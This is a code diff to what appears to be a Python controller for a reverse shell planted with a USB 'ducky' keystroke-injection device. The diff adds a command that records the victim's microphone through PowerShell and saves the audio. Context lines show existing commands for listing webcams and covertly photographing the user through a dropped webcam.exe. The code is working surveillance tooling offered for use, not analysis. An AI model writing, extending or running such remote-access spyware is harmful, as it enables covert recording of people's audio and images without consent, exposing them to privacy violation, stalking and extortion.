@@ -178,6 +178,8 @@ while not stop:
             print("ducky/webcam_list    N/A          List webcam devices")
             print("ducky/webcam_snap    N/A          Take a picture with the webcam and save in reverse shell directory")
             print("                     [device #]   Take a picture with the specified device number")
+            print("ducky/audio          N/A          Record audio for 10 seconds and save in reverse shell directory")
+            print("                     [seconds]    Record audio for a specified number of seconds")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -332,6 +334,14 @@ while not stop:
                 commands.append("$a = ([string] (& \"$env:userprofile/z/webcam.exe\" /filename \"$env:userprofile\\z\\webcam.bmp\" 2>&1)) -split \'\\n\'")
             commands.append("($a[10..$a.count] | out-string).trim()")
             commands.append("remove-variable a")
+            stdin = "; ".join(commands)
+        elif ducky_command[:5] == "audio":
+            options = [x for x in ducky_command.split(" ")[1:] if x]
+            length = 10
+            if len(options) > 0:
+                length = int(options[0])
+            commands = []
+            commands.append("Get-MicrophoneAudio -path \"$env:userprofile/z/audio.mp3\" -length " + str(length))
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
